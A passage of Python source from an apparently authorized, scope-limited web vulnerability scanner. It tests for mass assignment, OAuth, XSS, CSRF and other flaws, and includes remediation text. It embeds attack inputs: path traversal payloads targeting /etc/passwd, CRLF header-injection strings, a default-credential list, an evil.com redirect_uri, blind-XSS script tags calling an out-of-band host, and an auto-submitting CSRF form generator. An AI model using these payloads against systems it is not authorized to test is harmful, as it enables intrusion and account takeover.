        for key, nested in value.items():
            path = "{}.{}".format(prefix, key) if prefix else str(key)
            names.add(path)
            names.update(_json_field_names(nested, path))
    elif isinstance(value, list):
        for nested in value[:5]:
            names.update(_json_field_names(nested, prefix))
    return names


def _mass_assignment_read_url(endpoint_url, mutation_response):
    if mutation_response:
        location = mutation_response.headers.get("location", "")
        if location:
            return urljoin(endpoint_url, location)
        payload = _json_object(mutation_response)
        if payload:
            resource_id = (
                payload.get("id") or payload.get("uuid") or payload.get("_id")
                or payload.get("user_id") or payload.get("account_id")
            )
            if resource_id is not None:
                parsed = urlparse(endpoint_url)
                path = parsed.path.rstrip("/")
                if not path.endswith("/{}".format(resource_id)):
                    return "{}://{}{}/{}".format(
                        parsed.scheme, parsed.netloc, path, resource_id
                    )
    return endpoint_url


def _accepted_assignment_fields(before, after):
    accepted = {}
    for field, expected in MASS_ASSIGNMENT_PAYLOADS.items():
        if field in after and after.get(field) == expected and before.get(field) != expected:
            accepted[field] = {
                "before": before.get(field),
                "after": after.get(field),
                "injected": expected,
            }
    return accepted


def _redact_json(value):
    sensitive = {
        "password", "passwd", "secret", "token", "access_token",
        "refresh_token", "authorization", "cookie", "client_secret",
    }
    if isinstance(value, dict):
        return {
            key: ("<redacted>" if str(key).lower() in sensitive else _redact_json(nested))
            for key, nested in value.items()
        }
    if isinstance(value, list):
        return [_redact_json(item) for item in value]
    return value


async def _mass_assignment_request(client, method, url, headers, **kwargs):
    allowed, _reason = scope_policy.record_request(url, action="authenticated")
    if not allowed or throttle.host_dead:
        return None
    async with await throttle.gate():
        await throttle.record_request(url)
        try:
            response = await client.request(
                method, url, headers=headers, timeout=REQUEST_TIMEOUT.get(),
                follow_redirects=False, **kwargs
            )
            if throttle.is_block_response(response.status_code, response.text[:500]):
                await throttle.record_block(
                    response.status_code, response.text[:200], url,
                    dict(response.headers),
                )
            return response
        except httpx.HTTPError:
            await throttle.record_network_error(url)
            return None


async def hunt_mass_assignment_confirmed(client, schema_endpoints, session_headers):
    """Mutate known JSON bodies and confirm persistence with a separate GET."""
    results = []
    candidates = [
        endpoint for endpoint in (schema_endpoints or [])
        if isinstance(endpoint, dict)
        and str(endpoint.get("method", "")).upper() in {"POST", "PUT", "PATCH"}
        and isinstance(endpoint.get("body"), dict)
        and endpoint.get("body")
        and str(endpoint.get("url", "")).startswith(("http://", "https://"))
    ]

    for endpoint in candidates[:30]:
        url = str(endpoint["url"])
        method = str(endpoint["method"]).upper()
        if not scope_policy.validate_target(url, action="authenticated")[0]:
            continue

        before_response = await _mass_assignment_request(
            client, "GET", url, session_headers
        )
        before = _json_object(before_response)
        if method in {"PUT", "PATCH"} and before is None:
            continue

        injected_body = copy.deepcopy(endpoint["body"])
        injected_body.update(copy.deepcopy(MASS_ASSIGNMENT_PAYLOADS))
        mutation_response = await _mass_assignment_request(
            client, method, url,
            {**session_headers, "Content-Type": "application/json"},
            json=injected_body,
        )
        if not mutation_response or mutation_response.status_code not in MASS_ASSIGNMENT_SUCCESS:
            continue

        read_url = _mass_assignment_read_url(url, mutation_response)
        after_response = await _mass_assignment_request(
            client, "GET", read_url, session_headers
        )
        after = _json_object(after_response)
        if after is None:
            continue

        accepted = _accepted_assignment_fields(before or {}, after)
        if not accepted:
            continue

        accepted_names = set(accepted)
        severity = "HIGH" if accepted_names & HIGH_IMPACT_ASSIGNMENT_FIELDS else "MEDIUM"
        evidence = {
            "known_response_fields": sorted(_json_field_names(before or {})),
            "accepted_privileged_fields": accepted,
            "before_json": _redact_json(before or {}),
            "after_json": _redact_json(after),
            "mutation_status": mutation_response.status_code,
            "readback_status": after_response.status_code,
            "readback_url": read_url,
        }
        poc_body = _redact_json(injected_body)
        results.append(normalize_finding({
            "id": "MASS-{}-{}".format(
                int(time.time() * 1000),
                abs(hash(url + ",".join(sorted(accepted_names)))) % 99999,
            ),
            "source": "mass-assignment-tester",
            "title": "Mass Assignment - Privileged Fields Accepted",
            "vuln_type": "Mass Assignment - Privileged Fields Accepted",
            "vulnerability_class": "Mass Assignment",
            "severity": severity,
            "confidence": 99,
            "url": url,
            "affected_url": url,
            "method": method,
            "description": "The API persisted user-supplied privileged field(s): {}.".format(
                ", ".join(sorted(accepted_names))
            ),
            "evidence": json.dumps(evidence, ensure_ascii=False),
            "before_after_json": evidence,
            "poc": json.dumps(poc_body, ensure_ascii=False, indent=2),
            "poc_request_body": poc_body,
            "exact_request_body": poc_body,
            "exploitation_scenario": (
                "A low-privileged authenticated user can append protected fields "
                "to a normal JSON request and alter authorization or account state."
            ),
            "business_impact": "Unauthorized privilege or account-state changes were persisted.",
            "technical_impact": "Server-side object binding accepted protected JSON properties.",
            "remediation": (
                "Use explicit per-endpoint allowlists/DTOs for bindable fields and "
                "reject role, verification, balance, credit, subscription, and "
                "permission properties supplied by clients."
            ),
            "cwe": "CWE-915",
            "cvss": 8.1 if severity == "HIGH" else 6.5,
            "exploitability_status": "confirmed",
            "evidence_strength": "strong",
            "false_positive_risk": "low",
            "accepted_fields": sorted(accepted_names),
            "known_response_fields": sorted(_json_field_names(before or {})),
            "reproduction_steps": [
                "Authenticate as the low-privileged disposable test account.",
                "Send {} {} with poc_request_body.".format(method, url),
                "GET {} with the same account.".format(read_url),
                "Observe the injected privileged values persisted in the response.",
            ],
            "safe_manual_validation_steps": [
                "Use only a disposable authorized test account and resource.",
                "Record original values before testing and restore or delete the resource.",
            ],
            "redaction_status": "redacted",
            "verdict": "PASS",
        }))
    return results


async def hunt_oauth_misconfig(client, url):
    parsed = urlparse(url)
    blob = "{}?{}".format(parsed.path, parsed.query).lower()
    if not any(h in blob for h in OAUTH_HINTS):
        return []
    params = parse_qs(parsed.query)
    findings = []
    if "redirect_uri" in params:
        test_params = {k: v[0] for k, v in params.items()}
        test_params["redirect_uri"] = "https://evil.com/callback"
        test_url = "{}?{}".format(url.split("?")[0], urlencode(test_params))
        r = await tget(client, test_url, follow_redirects=False)
        loc = r.headers.get("location", "") if r else ""
        if "evil.com" in loc:
            findings.append(finding(
                "OAuth Redirect URI Misconfiguration", "HIGH", 82, url, "GET",
                "OAuth endpoint accepted attacker-controlled redirect_uri.",
                "Location: {}".format(loc[:250]),
                "Pin redirect URIs to exact registered values. Reject wildcards and open redirect intermediaries.",
                "CWE-601", 8.1,
                {"advanced_class": "oauth_misconfiguration"}
            ))
    if "response_type" in params and "token" in ",".join(params.get("response_type", [])).lower():
        findings.append(finding(
            "OAuth Implicit Flow Exposure", "MEDIUM", 72, url, "GET",
            "OAuth URL requests token response type; implicit flow increases token leakage risk.",
            "response_type={}".format(params.get("response_type", [""])[0]),
            "Prefer authorization code with PKCE. Avoid tokens in URL fragments.",
            "CWE-598", 5.9,
            {"advanced_class": "oauth_misconfiguration"}
        ))
    return findings


async def hunt_jwt_key_confusion_candidates(client, url):
    parsed = urlparse(url)
    blob = parsed.query.lower()
    if "jwt" not in blob and "token" not in blob and "authorization" not in blob:
        return []
    if re.search(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.", parsed.query):
        return [finding(
            "JWT Key Confusion Candidate", "HIGH", 66, url, "GET",
            "JWT appears in URL/query context; verify alg confusion, kid path traversal, and JWKS trust boundaries.",
            "JWT-like token present in query string.",
            "Keep JWTs out of URLs. Pin accepted algorithms, validate kid against trusted key IDs, and reject embedded JWK/JKU unless explicitly trusted.",
            "CWE-347", 7.5,
            {"advanced_class": "jwt_key_confusion", "needs_manual_verification": True}
        )]
    return []


async def hunt_websocket_security_issues(client, url):
    parsed = urlparse(url)
    blob = url.lower()
    if not any(k in blob for k in ("ws://", "wss://", "/ws", "websocket", "socket.io")):
        return []
    sev = "HIGH" if blob.startswith("ws://") else "MEDIUM"
    evidence = "WebSocket-like endpoint discovered"
    if blob.startswith("ws://"):
        evidence += " over cleartext ws://"
    if not any(k in blob for k in ("token", "auth", "session", "jwt")):
        evidence += "; no auth token visible in URL"
    return [finding(
        "WebSocket Security Review Candidate", sev, 64, url, "GET",
        "WebSocket endpoint requires origin, authorization, message schema, and rate-limit review.",
        evidence,
        "Enforce Origin checks, authenticated handshake, message-level authorization, schema validation, and per-user throttles.",
        "CWE-287", 6.8,
        {"advanced_class": "websocket_security", "needs_manual_verification": True}
    )]


async def hunt_http_desync_candidates(client, url):
    r = await tget(client, url, headers={**BASE_HEADERS, "Connection": "keep-alive"})
    if not r:
        return []
    h = {k.lower(): v.lower() for k, v in r.headers.items()}
    stack = " ".join([h.get("server", ""), h.get("via", ""), h.get("x-cache", "")])
    if any(k in stack for k in ("varnish", "akamai", "cloudfront", "fastly", "nginx")) and "keep-alive" in h.get("connection", ""):
        return [finding(
            "Request Smuggling / HTTP Desync Candidate", "MEDIUM", 58, url, "GET",
            "Proxy/cache stack detected; request smuggling requires controlled CL/TE verification outside the default safe scan.",
            "server/via/cache headers: {}".format(stack[:250]),
            "Normalize CL/TE handling at the edge, disable ambiguous requests, and test with a dedicated desync harness in a safe window.",
            "CWE-444", 6.5,
            {"advanced_class": "request_smuggling_desync", "passive_only": True}
        )]
    return []


async def hunt_cache_poisoning(client, url):
    marker = "burpollama-cache-test.local"
    r = await tget(client, url, headers={**BASE_HEADERS, "X-Forwarded-Host": marker})
    if not r:
        return []
    reflected = marker in (r.text or "").lower() or marker in " ".join(r.headers.values()).lower()
    cache_headers = {k.lower(): v for k, v in r.headers.items()
                     if k.lower() in ("x-cache", "cf-cache-status", "age", "via", "cache-control")}
    if reflected and cache_headers:
        return [finding(
            "Web Cache Poisoning Candidate", "HIGH", 72, url, "GET",
            "Unkeyed header appears reflected on a cacheable response.",
            "X-Forwarded-Host marker reflected; cache headers={}".format(cache_headers),
            "Do not reflect unkeyed request headers. Configure cache keys and strip unsafe forwarding headers.",
            "CWE-349", 7.5,
            {"advanced_class": "cache_poisoning", "needs_manual_verification": True}
        )]
    return []


async def hunt_xxe_candidates(client, url):
    blob = url.lower()
    if any(k in blob for k in ("xml", "soap", "saml", "wsdl")):
        return [finding(
            "XXE Candidate", "MEDIUM", 60, url, "GET",
            "XML/SOAP/SAML surface discovered; verify parser hardening and external entity handling.",
            "XML-related endpoint path/query.",
            "Disable DTD/external entities. Use hardened XML parsers and size limits.",
            "CWE-611", 6.5,
            {"advanced_class": "xxe", "needs_manual_verification": True}
        )]
    return []


async def hunt_file_upload_abuse_candidates(client, url):
    blob = url.lower()
    if not any(h in blob for h in UPLOAD_HINTS):
        return []
    return [finding(
        "File Upload Abuse Candidate", "HIGH", 65, url, "GET",
        "Upload/import/media endpoint discovered; verify extension validation, content sniffing, malware controls, and storage isolation.",
        "Upload hint in URL.",
        "Store uploads outside webroot, randomize names, validate content server-side, strip active content, and scan asynchronously.",
        "CWE-434", 7.5,
        {"advanced_class": "file_upload_abuse", "needs_manual_verification": True}
    )]


async def hunt_business_logic_candidates(client, url):
    blob = url.lower()
    if any(h in blob for h in ("discount", "coupon", "trial", "invite", "refund", "role", "plan", "limit")):
        return [finding(
            "Business Logic Abuse Candidate", "MEDIUM", 58, url, "GET",
            "Endpoint affects entitlement, pricing, invitations, limits, or roles; prioritize manual abuse-case testing.",
            "Business-logic hint in URL/query.",
            "Model abuse cases explicitly. Enforce server-side state machines, idempotency, authorization, and invariant checks.",
            "CWE-840", 6.0,
            {"advanced_class": "business_logic", "needs_manual_verification": True}
        )]
    return []


async def hunt_race_condition_candidates(client, url):
    blob = url.lower()
    if any(h in blob for h in RACE_HINTS):
        return [finding(
            "Race Condition Candidate", "MEDIUM", 57, url, "GET",
            "State-changing economic endpoint discovered; verify idempotency and concurrent replay behavior with authorization.",
            "Race-sensitive action hint in URL/query.",
            "Use idempotency keys, transactional constraints, row locks, and replay-safe state transitions.",
            "CWE-362", 6.5,
            {"advanced_class": "race_condition", "needs_manual_verification": True}
        )]
    return []


async def hunt_graphql_authorization_candidates(client, base_url):
    parsed = urlparse(base_url)
    base = "{}://{}".format(parsed.scheme, parsed.netloc)
    gql = base + "/graphql"
    r = await tpost(client, gql, json={"query": "{__typename}"})
    if not r or r.status_code not in (200, 400):
        return []
    findings = []
    if "errors" not in r.text.lower() or "__typename" in r.text:
        findings.append(finding(
            "GraphQL Authorization Testing Candidate", "MEDIUM", 66, gql, "POST",
            "GraphQL endpoint responds to unauthenticated/basic query; test BOLA/object ownership across queries and mutations.",
            "HTTP {} from /graphql for __typename probe.".format(r.status_code),
            "Enforce field-level and object-level authorization in every resolver. Disable introspection where appropriate.",
            "CWE-639", 6.8,
            {"advanced_class": "graphql_authorization", "needs_manual_verification": True}
        ))
    return findings


# ══════════════════════════════════════════════════════════════════════════════
#  CLASSES 25-28: Stored/DOM/Blind XSS and CSRF
# ══════════════════════════════════════════════════════════════════════════════

STATE_CHANGING_METHODS = {"POST", "PUT", "PATCH", "DELETE"}
XSS_MUTATION_METHODS = {"POST", "PUT", "PATCH"}
STORED_XSS_DISPLAY_PATHS = (
    "/profile", "/dashboard", "/feed", "/comments", "/posts",
    "/messages", "/notifications",
)
BLIND_XSS_HINTS = (
    "contact", "feedback", "bug", "report", "profile", "bio", "address",
    "support", "ticket", "message", "name",
)
CSRF_SENSITIVE_HINTS = (
    "/profile", "/password", "/email", "/settings", "/payment",
)
CSRF_TOKEN_HINTS = ("csrf", "_token", "xsrf", "nonce")
FILE_PATH_PARAM_NAMES = {
    "file", "path", "filename", "filepath", "page", "template", "view",
    "doc", "document", "load", "read", "include", "dir", "folder",
}
FILE_PATH_VALUE_HINTS = ("./", "../", ".html", ".php", ".txt", ".log")
TRAVERSAL_PAYLOADS = (
    "../../../../etc/passwd",
    r"..\..\..\..\windows\win.ini",
    "../etc/passwd%00.jpg",
    "....//....//etc/passwd",
    "/var/www/../../etc/passwd",
)
LFI_MARKERS = (
    ("Linux passwd", ("root:x:0:0", "bin:x:1:1", "/bin/bash")),
    ("Windows win.ini", ("[extensions]", "[fonts]", "for 16-bit app support")),
    ("PHP source", ("<?php", "<?=")),
)
DIRECTORY_LISTING_PATHS = (
    "/uploads/", "/files/", "/static/", "/backup/", "/logs/", "/tmp/",
)
COMMAND_PARAM_NAMES = {
    "cmd", "command", "exec", "execute", "run", "ping", "host", "ip",
    "address", "domain", "url", "filename", "path", "dir", "shell",
    "query", "search",
}
CRLF_PAYLOADS = (
    "%0d%0a",
    "%0aSet-Cookie:burpollama=test",
    "%0d%0aSet-Cookie:burpollama=test",
    "%E5%98%8A%E5%98%8D",
)
DEFAULT_CREDENTIALS = (
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("root", "root"),
    ("root", "toor"),
    ("test", "test"),
    ("guest", "guest"),
    ("administrator", "administrator"),
    ("admin", ""),
)
LOGIN_PATH_RE = re.compile(r"(?i)/(?:[^/?#]*/)*(?:login|auth|signin)(?:[/?#]|$)")
LOGIN_ERROR_TERMS = (
    "invalid", "incorrect", "failed", "unauthorized", "bad credentials",
    "wrong password", "authentication error", "login error",
)
LOCKOUT_TERMS = (
    "too many attempts", "rate limit", "account locked", "temporarily locked",
    "try again later",
)


def _string_field_paths(value, prefix=()):
    paths = []
    if isinstance(value, dict):
        for key, nested in value.items():
            paths.extend(_string_field_paths(nested, prefix + (str(key),)))
    elif isinstance(value, list):
        for index, nested in enumerate(value):
            paths.extend(_string_field_paths(nested, prefix + (index,)))
    elif isinstance(value, str):
        paths.append(prefix)
    return paths


def _replace_string_fields(value, replacements):
    cloned = copy.deepcopy(value)
    for path, replacement in replacements.items():
        cursor = cloned
        for part in path[:-1]:
            cursor = cursor[part]
        if path:
            cursor[path[-1]] = replacement
    return cloned


def _replace_path(value, path, replacement):
    return _replace_string_fields(value, {path: replacement})


def _path_name(path):
    return ".".join(str(part) for part in path)


def _flatten_scalar_fields(value, prefix=""):
    flattened = []
    if isinstance(value, dict):
        for key, nested in value.items():
            name = "{}.{}".format(prefix, key) if prefix else str(key)
            flattened.extend(_flatten_scalar_fields(nested, name))
    elif isinstance(value, list):
        for index, nested in enumerate(value):
            flattened.extend(_flatten_scalar_fields(
                nested, "{}[{}]".format(prefix, index)
            ))
    elif prefix:
        flattened.append((prefix, "" if value is None else str(value)))
    return flattened


def _exact_json_request(method, url, body):
    parsed = urlparse(url)
    target = parsed.path or "/"
    if parsed.query:
        target += "?" + parsed.query
    serialized = json.dumps(body, ensure_ascii=False)
    return "\r\n".join([
        "{} {} HTTP/1.1".format(method.upper(), target),
        "Host: {}".format(parsed.netloc),
        "Content-Type: application/json",
        "Content-Length: {}".format(len(serialized.encode("utf-8"))),
        "",
        serialized,
    ])


async def _authenticated_request(client, method, url, **kwargs):
    allowed, _reason = scope_policy.record_request(url, action="authenticated")
    if not allowed:
        return None
    async with await throttle.gate():
        await throttle.record_request(url)
        try:
            response = await client.request(
                method,
                url,
                timeout=REQUEST_TIMEOUT.get(),
                follow_redirects=False,
                **kwargs
            )
            if throttle.is_block_response(
                response.status_code, response.text[:500]
            ):
                await throttle.record_block(
                    response.status_code,
                    response.text[:200],
                    url,
                    dict(response.headers),
                )
            return response
        except (
            httpx.TimeoutException, httpx.ConnectError,
            httpx.RemoteProtocolError, httpx.ReadError, httpx.WriteError,
        ):
            await throttle.record_network_error(url)
            return None


def _response_excerpt(text, needle, radius=350):
    lower = text.lower()
    index = lower.find(needle.lower())
    if index < 0:
        return text[:700]
    start = max(0, index - radius)
    return text[start:index + len(needle) + radius]


async def hunt_stored_xss(client, schema_endpoints, discovered_urls):
    """Use a text-only marker and confirm persistence only in HTML GET output."""
    findings = []
    endpoints = [
        endpoint for endpoint in (schema_endpoints or [])
        if isinstance(endpoint, dict)
        and str(endpoint.get("method", "")).upper() in XSS_MUTATION_METHODS
        and str(endpoint.get("content_type", "")).lower() == "application/json"
        and isinstance(endpoint.get("body"), dict)
        and _string_field_paths(endpoint.get("body"))
        and endpoint.get("url")
    ]
    for endpoint in endpoints[:20]:
        url = str(endpoint["url"])
        method = str(endpoint["method"]).upper()
        paths = _string_field_paths(endpoint["body"])
        nonce = secrets.token_hex(6)
        marker = "burpollama_sxss_{}".format(nonce)
        injected = _replace_string_fields(
            endpoint["body"], {path: marker for path in paths}
        )
        injection_request = _exact_json_request(method, url, injected)
        injected_response = await _authenticated_request(
            client,
            method,
            url,
            headers={"Content-Type": "application/json"},
            json=injected,
        )
        if injected_response is None or injected_response.status_code >= 500:
            continue

        parsed = urlparse(url)
        origin = "{}://{}".format(parsed.scheme, parsed.netloc)
        candidates = [url]
        candidates.extend(urljoin(origin + "/", path.lstrip("/"))
                          for path in STORED_XSS_DISPLAY_PATHS)
        candidates.extend(
            candidate for candidate in discovered_urls
            if urlparse(candidate).netloc == parsed.netloc
            and not candidate.lower().endswith((".js", ".css", ".map"))
        )
        candidates = list(dict.fromkeys(candidates))[:35]
        field_names = {
            str(part).lower()
            for path in paths for part in path if isinstance(part, str)
        }

        for display_url in candidates:
            response = await _authenticated_request(
                client, "GET", display_url
            )
            if response is None or response.status_code >= 500:
                continue
            content_type = response.headers.get("content-type", "").lower()
            text = response.text or ""
            raw_html = "html" in content_type and marker in text
            decoded_text = html.unescape(unquote(text))
            encoded_html = (
                "html" in content_type
                and marker not in text
                and marker in decoded_text
            )
            same_fields = any(
                re.search(r"(?i)[\"'<>\s]{}[\"'<>\s:=]".format(
                    re.escape(name)
                ), text)
                for name in field_names if name
            )
            if not raw_html and not encoded_html:
                continue
            status = "confirmed" if raw_html else "probable"
            evidence = {
                "marker": marker,
                "injected_fields": [_path_name(path) for path in paths],
                "injection_request": injection_request,
                "display_request": "GET {}".format(display_url),
                "display_status": response.status_code,
                "display_content_type": content_type,
                "same_field_names_observed": same_fields,
                "display_response_excerpt": _response_excerpt(
                    text if raw_html else decoded_text, marker
                ),
            }
            findings.append(normalize_finding({
                "source": "stored-xss-class-25",
                "title": "Stored XSS Marker Persisted",
                "vuln_type": "Stored XSS",
                "severity": "HIGH",
                "confidence": 96 if raw_html else 82,
                "url": display_url,
                "method": "GET",
                "parameter": ", ".join(_path_name(path) for path in paths),
                "description": (
                    "A unique stored-input marker appeared raw in an HTML GET response."
                    if raw_html else
                    "A unique stored-input marker appeared only after decoding the HTML response."
                ),
                "evidence": json.dumps(evidence, ensure_ascii=False),
                "injection_request": injection_request,
                "display_response": evidence["display_response_excerpt"],
                "exploitability_status": status,
                "evidence_strength": "strong" if raw_html else "moderate",
                "false_positive_risk": "low" if raw_html else "medium",
                "business_impact": (
                    "Persisted attacker-controlled content may execute for other users "
                    "or administrators if output encoding can be bypassed."
                ),
                "remediation": (
                    "Apply context-aware output encoding to stored user input and "
                    "sanitize any intentionally supported rich HTML."
                ),
                "cwe": "CWE-79",
                "cvss": 8.0,
                "reproduction_steps": [
                    "Send the recorded JSON injection request using an authorized test account.",
                    "Request the recorded display URL.",
                    "Locate the unique marker in the HTML response evidence.",
                ],
                "redaction_status": "not_required",
            }))
            break
    return findings


DOM_XSS_SINKS = (
    ("document.write", re.compile(r"\bdocument\.write(?:ln)?\s*\(")),
    ("innerHTML", re.compile(r"\.(?:innerHTML|outerHTML)\s*=")),
    ("eval", re.compile(r"\beval\s*\(")),
    ("setTimeout(string)", re.compile(r"\bsetTimeout\s*\(\s*(?!function\b|(?:\([^)]*\)|[A-Za-z_$][\w$]*)\s*=>)")),
    ("setInterval(string)", re.compile(r"\bsetInterval\s*\(\s*(?!function\b|(?:\([^)]*\)|[A-Za-z_$][\w$]*)\s*=>)")),
    ("location navigation", re.compile(r"\b(?:location\.href\s*=|location\.(?:replace|assign)\s*\()")),
    ("jQuery HTML sink", re.compile(r"\$\s*\([^)]*\)\s*\.(?:html|append)\s*\(")),
)
DOM_XSS_SOURCES = (
    ("location.hash", re.compile(r"\blocation\.hash\b")),
    ("location.search", re.compile(r"\blocation\.search\b")),
    ("location.href", re.compile(r"\blocation\.href\b")),
    ("document.URL", re.compile(r"\bdocument\.URL\b")),
    ("document.location", re.compile(r"\bdocument\.location\b")),
    ("window.location", re.compile(r"\bwindow\.location\b")),
    ("document.referrer", re.compile(r"\bdocument\.referrer\b")),
    ("document.cookie", re.compile(r"\bdocument\.cookie\b")),
    ("URLSearchParams", re.compile(r"\bURLSearchParams\s*\(")),
    ("window.name", re.compile(r"\bwindow\.name\b")),
    ("postMessage data", re.compile(r"\b(?:event|e)\.data\b|\bmessage\.data\b")),
)


async def hunt_dom_xss(client, discovered_urls):
    findings = []
    js_urls = [
        url for url in discovered_urls
        if urlparse(url).path.lower().endswith(".js")
        and ".min.js" not in urlparse(url).path.lower()
    ][:40]
    for js_url in js_urls:
        response = await tget(client, js_url, follow_redirects=False)
        if response is None or response.status_code != 200:
            continue
        lines = (response.text or "")[:3_000_000].splitlines()
        source_hits = []
        for line_number, line in enumerate(lines, start=1):
            for source_name, pattern in DOM_XSS_SOURCES:
                if pattern.search(line):
                    source_hits.append((line_number, source_name))
        for sink_line, line in enumerate(lines, start=1):
            for sink_name, pattern in DOM_XSS_SINKS:
                if not pattern.search(line):
                    continue
                nearby = [
                    hit for hit in source_hits
                    if abs(hit[0] - sink_line) <= 10
                ]
                if not nearby:
                    continue
                source_line, source_name = min(
                    nearby, key=lambda hit: abs(hit[0] - sink_line)
                )
                start = max(1, min(source_line, sink_line) - 2)
                end = min(len(lines), max(source_line, sink_line) + 2)
                snippet = "\n".join(
                    "{:>5}: {}".format(index, lines[index - 1])
                    for index in range(start, end + 1)
                )
                findings.append(normalize_finding({
                    "source": "dom-xss-class-26",
                    "title": "DOM XSS Candidate",
                    "vuln_type": "dom_xss_candidate",
                    "severity": "HIGH",
                    "confidence": 76,
                    "url": js_url,
                    "method": "GET",
                    "description": (
                        "A browser-controlled source appears within ten lines of "
                        "a dangerous DOM sink."
                    ),
                    "evidence": snippet,
                    "js_file": js_url,
                    "line_number": sink_line,
                    "source_name": source_name,
                    "sink_name": sink_name,
                    "data_flow_path": "{} line {} -> {} line {}".format(
                        source_name, source_line, sink_name, sink_line
                    ),
                    "note": (
                        "Manual confirmation required - open this URL with # payload to test"
                    ),
                    "exploitability_status": "needs_manual_validation",
                    "evidence_strength": "weak",
                    "false_positive_risk": "high",
                    "business_impact": (
                        "If the source reaches the sink without sanitization, a crafted "
                        "URL could execute script in the victim's browser."
                    ),
                    "remediation": (
                        "Replace unsafe DOM sinks with textContent or safe APIs and "
                        "validate browser-controlled input before use."
                    ),
                    "cwe": "CWE-79",
                    "cvss": 7.4,
                    "reproduction_steps": [
                        "Open the application page that loads the affected JavaScript.",
                        "Supply a harmless marker through the identified browser source.",
                        "Trace whether the marker reaches the recorded sink at runtime.",
                    ],
                    "redaction_status": "not_required",
                }))
                break
    return findings


def _blind_xss_endpoint(endpoint):
    blob = " ".join([
        str(endpoint.get("url", "")),
        str(endpoint.get("description", "")),
        " ".join(map(str, endpoint.get("tags", []) or [])),
        " ".join(_path_name(path) for path in _string_field_paths(
            endpoint.get("body", {})
        )),
    ]).lower()
    return any(hint in blob for hint in BLIND_XSS_HINTS)


async def hunt_blind_xss(client, schema_endpoints):
    findings = []
    endpoints = [
        endpoint for endpoint in (schema_endpoints or [])
        if isinstance(endpoint, dict)
        and str(endpoint.get("method", "")).upper() == "POST"
        and str(endpoint.get("content_type", "")).lower() == "application/json"
        and isinstance(endpoint.get("body"), dict)
        and _string_field_paths(endpoint.get("body"))
        and _blind_xss_endpoint(endpoint)
    ]
    for endpoint in endpoints[:15]:
        url = str(endpoint["url"])
        paths = _string_field_paths(endpoint["body"])
        payload_urls = {}
        replacements = {}
        oob_enabled = bool(
            oob.available and scope_policy.config.oob_testing_enabled
        )
        if oob_enabled:
            for path in paths:
                field = _path_name(path)
                nonce = secrets.token_hex(6)
                payload_url = oob.generate_payload(
                    CTX_BLIND_XSS,
                    field,
                    url,
                    metadata={"bxss_nonce": nonce},
                )
                if not payload_url:
                    continue
                payload_urls[path] = payload_url
                replacements[path] = (
                    '<script src="{}/bxss_{}"></script>'.format(
                        payload_url.rstrip("/"), nonce
                    )
                )
        else:
            nonce = secrets.token_hex(6)
            marker = "<!-- burpollama_bxss_{} -->".format(nonce)
            replacements = {path: marker for path in paths}

        if not replacements:
            continue
        injected = _replace_string_fields(endpoint["body"], replacements)
        injection_request = _exact_json_request("POST", url, injected)
        response = await _authenticated_request(
            client,
            "POST",
            url,
            headers={"Content-Type": "application/json"},
            json=injected,
        )
        if response is None or response.status_code >= 500:
            continue
        for path, payload_url in payload_urls.items():
            oob.annotate_payload(payload_url, {
                "injection_request": injection_request,
                "injected_payload": replacements[path],
                "method": "POST",
            })

        findings.append(normalize_finding({
            "source": "blind-xss-class-27",
            "title": (
                "Blind XSS Payload Submitted - Awaiting OOB Callback"
                if oob_enabled else
                "Blind XSS Marker Submitted - Manual Async Check Required"
            ),
            "vuln_type": "Blind XSS Candidate",
            "severity": "HIGH",
            "confidence": 65 if oob_enabled else 50,
            "url": url,
            "method": "POST",
            "parameter": ", ".join(_path_name(path) for path in paths),
            "description": (
                "Unique Blind XSS payloads were submitted to fields commonly "
                "rendered in administrative or asynchronous workflows."
            ),
            "evidence": injection_request,
            "injection_request": injection_request,
            "oob_payloads": list(payload_urls.values()),
            "exploitability_status": "needs_manual_validation",
            "evidence_strength": "weak",
            "false_positive_risk": "high",
            "business_impact": (
                "A confirmed callback may indicate script execution in a privileged "
                "support or administrative user's browser."
            ),
            "remediation": (
                "Sanitize and contextually encode all stored user input before it is "
                "rendered in dashboards, email templates, or support tooling."
            ),
            "cwe": "CWE-79",
            "cvss": 8.0,
            "note": (
                "Confirmation requires an attributed OOB HTTP callback."
                if oob_enabled else
                "OOB was unavailable; manually check asynchronous render locations."
            ),
            "reproduction_steps": [
                "Submit the recorded request using an authorized test account.",
                "Wait for the content to be processed by the intended workflow.",
                "Confirm only if the unique OOB HTTP path is requested.",
            ],
            "redaction_status": "not_required",
        }))
    return findings


def _csrf_token_present(body):
    if isinstance(body, dict):
        for key, nested in body.items():
            if any(hint in str(key).lower() for hint in CSRF_TOKEN_HINTS):
                return True
            if _csrf_token_present(nested):
                return True
    elif isinstance(body, list):
        return any(_csrf_token_present(item) for item in body)
    return False


def _csrf_html_poc(url, body):
    inputs = "\n".join(
        '  <input type="hidden" name="{}" value="{}">'.format(
            html.escape(name, quote=True),
            html.escape(value, quote=True),
        )
        for name, value in _flatten_scalar_fields(body)
    )
    return (
        '<form action="{}" method="POST">\n{}\n'
        '  <button>Click me</button>\n</form>\n'
        '<script>document.forms[0].submit()</script>'
    ).format(html.escape(url, quote=True), inputs)


async def hunt_csrf(client, schema_endpoints, existing_findings):
    findings = []
    endpoints = [
        endpoint for endpoint in (schema_endpoints or [])
        if isinstance(endpoint, dict)
        and str(endpoint.get("method", "")).upper() in STATE_CHANGING_METHODS
        and any(hint in urlparse(str(endpoint.get("url", ""))).path.lower()
                for hint in CSRF_SENSITIVE_HINTS)
        and endpoint.get("url")
    ]
    cors_origins = {
        urlparse(str(item.get("url", ""))).netloc
        for item in (existing_findings or [])
        if "cors" in str(item.get("vuln_type", "")).lower()
    }
    for endpoint in endpoints[:20]:
        url = str(endpoint["url"])
        method = str(endpoint["method"]).upper()
        body = endpoint.get("body") if isinstance(endpoint.get("body"), dict) else {}
        parameter_names = [
            str(name) for name in (endpoint.get("params") or [])
        ]
        missing_token = not (
            _csrf_token_present(body)
            or any(
                any(hint in name.lower() for hint in CSRF_TOKEN_HINTS)
                for name in parameter_names
            )
        )
        response = await _authenticated_request(
            client,
            method,
            url,
            headers={
                "Content-Type": "application/json",
                "Origin": "https://burpollama.invalid",
            },
            json=body if body else None,
        )
        if response is None:
            continue
        accepted_without_referer = 200 <= response.status_code < 300
        if not accepted_without_referer:
            continue
        set_cookies = response.headers.get_list("set-cookie")
        missing_samesite = bool(set_cookies) and not any(
